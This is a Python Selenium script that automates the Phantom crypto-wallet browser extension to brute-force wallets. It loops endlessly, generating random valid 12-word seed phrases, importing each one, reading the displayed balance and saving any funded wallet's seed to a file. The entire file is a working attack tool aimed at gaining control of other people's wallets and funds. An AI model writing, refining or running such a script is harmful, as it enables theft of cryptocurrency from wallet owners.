# phantomBot_Random.py (Random 12-Word Brute-Force)
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
import time
import os
from mnemonic import Mnemonic # New, important library

# --- USER INPUT ---
# Path to the Phantom .crx file
EXTENSION_PATH = r'YOUR EXTENSION PATH FROM PHANTOM (crx)'
# -------------------------

# Open Chrome with the extension
OPT = webdriver.ChromeOptions()
OPT.add_extension(EXTENSION_PATH)
DRIVER = webdriver.Chrome(options=OPT)

# Initialize the Mnemonic tool
mnemo = Mnemonic("english")

def main():
    # Wait for the extension to install and switch to the Phantom tab
    time.sleep(4)
    if len(DRIVER.window_handles) > 1:
        DRIVER.switch_to.window(DRIVER.window_handles[-1])
    
    count = 0
    start_time = time.time()
    
    # Endless loop for generation and checking
    while True:
        count += 1
        
        # 1. Generate a RANDOM but VALID 12-word phrase
        entropy = os.urandom(16) # 128 bits of randomness
        phrase_string = mnemo.to_mnemonic(entropy)
        
        rate = count / (time.time() - start_time) if count > 1 else 0
        print(f"Attempt #{count} | Rate: {rate:.1f}/s | Testing: {' '.join(phrase_string.split()[:3])}...", end='\r')

        # 2. Input phrase and check wallet
        balance = inputSeedAndCheck(phrase_string)
        if balance:
            print(f"\n\n!!! SUCCESS !!! Wallet found with phrase: {phrase_string}")
            save_wallet(phrase_string, balance)
            # Optional: End the script here with 'return'
            # return
        
        # 3. Reset the page for the next attempt
        DRIVER.get('chrome-extension://bfnaelmomeimhlpmgjnjophhpkkoljpa/onboarding.html?append=true')
        time.sleep(1)


def inputSeedAndCheck(seed_word_string):
    """Inputs a phrase and checks if the wallet has a balance. Returns balance on success."""
    try:
        # Find the input field and enter the phrase
        elem = tryToLocateElement('/html/body/div/main/div[2]/form/div/div[2]/div[1]/input')
        if not elem: return None
        
        elem.clear() # Clear field before entering new phrase
        elem.send_keys(seed_word_string)
        time.sleep(0.5)
        
        # Click "Import Wallet"
        button = tryToLocateElement('/html/body/div/main/div[2]/form/button')
        if not button: return None
        button.click()
        time.sleep(0.5)

        # Click "View Accounts" if the button exists
        try:
            view_accounts_button = tryToLocateElement('/html/body/div/main/div[2]/form/button[1]', timeout=1)
            if view_accounts_button: view_accounts_button.click()
        except:
            pass

        # Check the balance
        return accountHasBalance() # Returns balance text or None

    except Exception:
        return None


def accountHasBalance():
    """Checks if the imported wallet has a balance. Returns balance text if found."""
    try:
        # Find the element showing the total dollar value
        balance_element = tryToLocateElement("//div[starts-with(text(), '$')]", timeout=10)
        if balance_element:
            balance_text = balance_element.text
            if balance_text != "$0.00":
                print(f"\n[INFO] Balance found: {balance_text}")
                return balance_text
        return None
    except Exception:
        return None

def save_wallet(phrase, balance):
    """Saves the found seed phrase and balance to a file."""
    with open("found_wallets.txt", "a") as f:
        f.write(f"Found Wallet (Phantom Random):\n")
        f.write(f"Seed    : {phrase}\n")
        f.write(f"Balance : {balance}\n")
        f.write("="*50 + "\n")

def tryToLocateElement(xpath, timeout=5):
    """Repeatedly tries to find an element."""
    sleepTimer = 0
    while sleepTimer < timeout:
        try:
            elem = DRIVER.find_element(by=By.XPATH, value=xpath)
            return elem
        except NoSuchElementException:
            time.sleep(0.25)
            sleepTimer += 0.25
    return None

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nScript terminated by user.")
    except Exception as e:
        print(f"\nAn unexpected error terminated the script: {e}")
    finally:
        print("\nClosing script.")
        if 'DRIVER' in locals():
            DRIVER.quit()
